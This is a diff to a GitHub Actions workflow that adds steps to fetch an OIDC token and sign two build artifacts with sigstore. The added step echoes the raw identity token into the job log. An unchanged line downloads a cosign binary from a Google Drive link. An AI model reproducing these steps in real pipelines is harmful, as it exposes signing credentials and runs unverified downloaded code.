@@ -44,6 +44,23 @@ jobs:
         with:
           inputs: dist/output1 dist/output2
 
+      - name: Get OIDC token
+        id: get-oidc-token
+        run: |
+          identity_token=$( \
+            curl -H \
+              "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sigstore" \
+            | jq -r .value \
+          )
+          echo "identity-token=$identity_token" >> $GITHUB_OUTPUT
+          echo "$identity_token"
+
+      - name: Sign artifact with sigstore
+        run: |
+          python -m sigstore sign --identity-token ${{ steps.get-oidc-token.outputs.identity-token }} dist/output1 --bundle dist/output1.sigstore-plain.json
+          python -m sigstore sign --identity-token ${{ steps.get-oidc-token.outputs.identity-token }} dist/output2 --bundle dist/output2.sigstore-plain.json
+
       - name: Install cosign
         run: |
           curl -sSfL 'https://drive.usercontent.google.com/download?id=1moZgK6_REb4YqVv2wo0OgHUdm2gqkfWy&export=download&authuser=0&confirm=t&uuid=b9bd156f-0df0-43d5-b3a1-dda4e63e5605&at=AENtkXZ7-xqbsEb4dhlSeclxvqEK:1733263724683' --output cosign
